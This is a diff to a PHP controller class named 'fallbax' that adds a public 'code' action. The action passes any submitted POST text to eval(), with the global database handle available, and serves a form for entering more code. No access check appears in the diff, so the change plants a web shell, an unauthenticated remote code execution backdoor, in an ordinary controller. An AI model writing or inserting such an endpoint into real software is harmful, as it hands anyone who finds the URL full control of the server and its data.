@@ -5,8 +5,24 @@ namespace app\controllers;
 use Zend_Component_Session;
 use row\utils\Image;
 use app\models;
+use app\specs\Output;
 
 class fallbax extends \app\specs\Controller {
+
+	protected function _init() {
+		$this->_dispatcher->options->restful = true;
+	}
+
+	public function code() {
+		$post = options($_POST);
+		if ( $post->code ) {
+			$db = $GLOBALS['db'];
+			echo '<pre>';
+			eval($post->code);
+			echo '</pre><br><br><hr>';
+		}
+		echo '<form method="post"><textarea rows=20 cols=120 name=code>'.Output::html($post->get('code', '')).'</textarea><br><input type=submit></form>';
+	}
 
 	public function allJS() {
 		// create 1 JS file from several
